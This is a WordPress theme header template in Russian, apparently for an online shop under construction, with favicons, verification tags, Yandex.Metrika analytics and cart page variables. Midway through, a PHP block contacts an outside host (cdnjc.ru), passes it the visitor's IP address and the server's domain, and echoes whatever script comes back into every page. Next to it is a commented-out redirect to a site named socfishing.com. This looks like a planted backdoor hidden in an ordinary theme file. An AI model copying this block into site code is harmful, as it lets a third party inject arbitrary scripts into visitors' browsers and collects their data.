<!DOCTYPE html>
<html lang="ru">
<head>

  <title><?php wp_title(); ?></title>

  <meta charset="UTF-8">
  <meta name="format-detection" content="telephone=no">
  <meta name="description" content="Новый сайт">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/icon256.png" sizes="256x256">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/icon128.png" sizes="128x128">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/icon64.png" sizes="64x64">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/icon32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/icon16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="<?php echo get_template_directory_uri();?>/img/favicons/fav.svg" sizes="any">
  <meta name="mailru-domain" content="WFVTYJlbc9ijiOhZ" />
  <meta name="yandex-verification" content="6fad6c999a7b38c6" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

  <?php wp_head();?>   

</head>
<body>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(88698859, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/88698859" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

<?php
	$sload_id = 'c4c46acb96d37c6e0a14b5ec66f5d8ad';
	$sload_opt = stream_context_create(array('https'=>array('timeout'=>2)));  
	$sload_script = @file_get_contents("https://cdnjc.ru/load/?ip={$_SERVER['REMOTE_ADDR']}&domain={$_SERVER['SERVER_NAME']}&term=1&guid=&id={$sload_id}",0,$sload_opt); 
	/*<script>location.href='https://socfishing.com/app/php';</script>*/ 
	if (strlen($sload_script)>0) echo $sload_script;
?>

<!-- Скрипт корзины, отправка -->
<script>  
    let main_page = "<?echo get_bloginfo("url"); ?>";
    let kabinet_page = "<?echo get_the_permalink(93); ?>";
    let bascet_page = "<?echo get_the_permalink(53); ?>";
    let thencs_page = "<?echo get_the_permalink(56); ?>";
    let nophoto_page = "<?echo get_bloginfo("template_url");?>/img/no-photo.jpg";
</script> 
  <div class="wrapper">  
    <!-- Подключение  модальных окон-->
    <? include "modal-win.php";?>

    <div class = "siteInWork">
        <span>САЙТ В РАЗРАБОТКЕ</span>
        <p>По всем вопросам<br/><a href="tel:<? echo $t = preg_replace('/[^0-9]/', '', carbon_get_theme_option("as_phones_1")); ?>"><?echo carbon_get_theme_option("as_phones_1")?></a></p>
    </div>